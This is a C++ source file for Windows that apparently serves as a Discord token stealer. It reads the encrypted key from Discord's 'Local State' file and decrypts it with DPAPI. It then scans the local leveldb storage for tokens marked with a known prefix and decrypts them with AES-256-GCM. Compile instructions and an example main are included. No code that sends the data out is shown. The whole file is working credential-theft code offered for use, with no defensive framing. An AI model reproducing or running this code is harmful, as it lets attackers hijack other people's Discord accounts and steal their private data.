#define WIN32_LEAN_AND_MEAN
#include <openssl/evp.h>
#include <windows.h>
#include <wincrypt.h>

#include <filesystem>
#include <fstream>
#include <iostream>
#include <regex>
#include <string>
#include <vector>

// how to compile and use
// g++ main.cpp -o main -lcrypt32 -lssl -lcrypto
// main.exe

/*
* EXAMPLE USAGE:

int main() {
        auto masterKey = getMasterKey();
        if (masterKey.empty()) {
                std::cout << "Failed to get master key\n";
                return 1;
        }
        std::cout << "Got master key (" << masterKey.size() << " bytes)\n";

        std::string ldbPath = std::string(getenv("APPDATA")) + "\\discord\\Local Storage\\leveldb";
        scanLevelDB(ldbPath, masterKey);

        return 0;
}
*/

#pragma comment(lib, "crypt32.lib")

std::string readFile(const std::string& path) {
        std::ifstream f(path, std::ios::binary);
        return std::string(std::istreambuf_iterator<char>(f), {});
}

// Decode base64
std::vector<uint8_t> base64Decode(const std::string& in) {
        std::vector<uint8_t> out(in.size());
        int len = EVP_DecodeBlock(out.data(), (const uint8_t*)in.data(), (int)in.size());
        // trim padding
        int pad = 0;
        for (int i = in.size() - 1; i >= 0 && in[i] == '='; i--) pad++;
        out.resize(len - pad);
        return out;
}

// DPAPI decrypt
std::vector<uint8_t> dpapiDecrypt(const std::vector<uint8_t>& data) {
        DATA_BLOB input{(DWORD)data.size(), (BYTE*)data.data()};
        DATA_BLOB output{};
        if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output))
                return {};
        std::vector<uint8_t> result(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return result;
}

// AES-256-GCM decrypt
std::string aesGcmDecrypt(const std::vector<uint8_t>& key, const std::vector<uint8_t>& data) {
        // layout: [3 bytes "v10"] [12 bytes IV] [ciphertext] [16 bytes tag]
        if (data.size() < 3 + 12 + 16) return "";

        const uint8_t* iv = data.data() + 3;
        const uint8_t* ct = data.data() + 3 + 12;
        int ctLen = (int)data.size() - 3 - 12 - 16;
        const uint8_t* tag = data.data() + data.size() - 16;

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        std::string result(ctLen, '\0');
        int len = 0;

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr);
        EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv);
        EVP_DecryptUpdate(ctx, (uint8_t*)result.data(), &len, ct, ctLen);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void*)tag);

        if (EVP_DecryptFinal_ex(ctx, (uint8_t*)result.data() + len, &len) <= 0)
                result.clear();

        EVP_CIPHER_CTX_free(ctx);
        return result;
}

std::vector<uint8_t> getMasterKey() {
        std::string localStatePath = std::string(getenv("APPDATA")) + "\\discord\\Local State";
        std::string content = readFile(localStatePath);

        // pull encrypted_key value from JSON (simple string search, no JSON parser needed)
        std::string marker = "\"encrypted_key\":\"";
        auto pos = content.find(marker);
        if (pos == std::string::npos) return {};
        pos += marker.size();
        auto end = content.find('"', pos);
        std::string b64key = content.substr(pos, end - pos);

        auto decoded = base64Decode(b64key);
        if (decoded.size() < 5) return {};

        // strip "DPAPI" prefix (first 5 bytes)
        std::vector<uint8_t> encrypted(decoded.begin() + 5, decoded.end());
        return dpapiDecrypt(encrypted);
}

std::vector<std::string> scanLevelDB(const std::string& dir, const std::vector<uint8_t>& masterKey) {
        std::regex encRegex(R"(dQw4w9WgXcQ:[A-Za-z0-9+/=]+)");
        std::vector<std::string> tokens;

        for (auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
                auto ext = entry.path().extension().string();
                if (ext != ".ldb" && ext != ".log") continue;

                std::string content = readFile(entry.path().string());
                auto begin = std::sregex_iterator(content.begin(), content.end(), encRegex);

                for (auto it = begin; it != std::sregex_iterator(); ++it) {
                        std::string b64 = (*it)[0].str().substr(12);
                        auto encrypted = base64Decode(b64);
                        std::string token = aesGcmDecrypt(masterKey, encrypted);
                        if (!token.empty())
                                tokens.push_back(token);
                }
        }

        return tokens;
}
